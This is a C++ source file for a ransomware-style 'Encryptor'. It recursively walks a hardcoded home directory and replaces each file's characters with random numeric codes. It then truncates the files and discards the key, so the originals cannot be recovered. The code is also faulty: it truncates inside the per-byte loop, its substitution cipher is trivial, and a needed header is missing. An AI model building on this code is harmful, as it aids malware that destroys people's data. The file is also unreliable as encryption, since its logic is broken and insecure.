#include <iostream>
#include <string>
#include <filesystem>
#include <fstream>
#include <random>
#include <map>
#include <unordered_map>
#include "header.hpp"

auto Encryptor::encryptor() -> void {
    std::unordered_map<std::string, int> files;

    for (std::filesystem::recursive_directory_iterator i("/home/draco/TobeEncrypted"), end; i != end; ++i) {
        if (!is_directory(i->path()))
            files[i->path()];
    }

    int count = 0;
    for (auto &it : files) {
        count+=1;
        it.second = count;
        std::cout << it.first << " - " << it.second << std::endl;
    }

    auto path = std::string("/home/draco/TobeEncrypted");
    char byte = 0;

    std::string combinations = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+=[]{};:'\",./?,<~>`|\\1234567890";
    unsigned seed = std::chrono::steady_clock::now().time_since_epoch().count();
    std::default_random_engine engine(seed);
    int key;

    std::map<char, int> encryption;

    for (auto &combination : combinations) {
        std::uniform_int_distribution<int> keys(100000, 999999);
        key = keys(engine);
        encryption[combination] = key;
    }

    std::cout << '\n';

    for (auto &entry : files) {
        std::cout << entry.first << std::endl;
        std::ifstream read(entry.first);

        if (!read.is_open()) std::cerr << "[-] Could not open the file - '" << entry.first << "'" << std::endl;
        else std::cout << "[*] File opened" << std::endl;

        auto encrypt = std::fstream(entry.first, std::ios::out | std::ios::app);

        while (read.get(byte)) {
            if (encryption.contains(byte)) {
                for (auto const &it : encryption) {
                    if (it.first == byte) {
                        encrypt << it.second;
                    }
                }
                encrypt << '\n';
            }

            std::ofstream ofs;
            ofs.open(entry.first, std::ofstream::out | std::ofstream::trunc);
            ofs.close();
        }

        std::cout << "[*] File(s) encrypted successfully\n" << std::endl;
    }
}
